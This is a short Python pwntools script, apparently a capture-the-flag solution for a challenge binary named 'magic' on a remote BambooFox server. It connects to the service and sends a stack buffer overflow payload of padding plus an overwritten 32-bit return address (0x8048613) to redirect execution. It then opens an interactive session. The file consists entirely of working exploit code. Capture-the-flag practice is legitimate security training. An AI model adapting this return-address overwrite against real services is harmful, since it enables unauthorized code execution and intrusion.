#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
#context.log_level = 'debug'

def main():
    elf = ELF('./magic')
    # libc = ELF('')
    proc = remote('bamboofox.cs.nctu.edu.tw', 10000)
    # proc = elf.process()

    #log.debug('You may attatch this process to gdb now.')
    #raw_input()

    proc.recvuntil(': ')
    proc.sendline(b'aaaa')

    proc.recvuntil(': ')
    # Do not use elf.sym['never_use'], the resulting bytes
    # contain a '\x0d' which will cut all subsequent bytes off...
    payload  = 4 * b'\x00' + 68 * b'A' # padding
    payload += p32(0x8048613)          # ret
    proc.sendline(payload)

    proc.interactive()

if __name__ == '__main__':
    main()
